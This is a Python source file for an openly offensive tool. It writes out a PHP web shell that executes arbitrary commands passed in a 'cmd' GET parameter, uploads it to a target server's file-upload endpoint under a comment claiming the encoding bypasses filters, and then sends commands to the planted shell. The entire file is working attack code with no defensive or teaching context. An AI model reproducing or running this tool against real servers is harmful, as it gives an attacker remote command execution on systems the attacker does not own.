import requests
import base64
import random
import string

class WebShellUpload:
    def __init__(self, target_url, upload_endpoint, file_path):
        self.target_url = target_url
        self.upload_endpoint = upload_endpoint
        self.file_path = file_path

    def generate_obfuscated_payload(self):
        """
        Generate an obfuscated PHP web shell payload.
        """
        payload = '''<?php
            if(isset($_GET['cmd'])){
                echo shell_exec($_GET['cmd']);
            }
        ?>'''
        # Base64 encode to bypass filters
        obfuscated_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        return obfuscated_payload

    def upload_webshell(self):
        """
        Upload the obfuscated PHP shell to the target server.
        """
        obfuscated_payload = self.generate_obfuscated_payload()
        files = {'file': (self.file_path, base64.b64decode(obfuscated_payload), 'application/x-php')}
        try:
            response = requests.post(f"{self.target_url}/{self.upload_endpoint}", files=files)
            if response.status_code == 200:
                print(f"Successfully uploaded web shell to {self.target_url}")
                return True
            else:
                print(f"Failed to upload web shell. Status Code: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error uploading web shell: {e}")
            return False

    def execute_webshell(self, cmd):
        """
        Execute commands on the uploaded web shell.
        """
        try:
            response = requests.get(f"{self.target_url}/webshell.php?cmd={cmd}")
            print(f"Web shell response: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Error executing command: {e}")
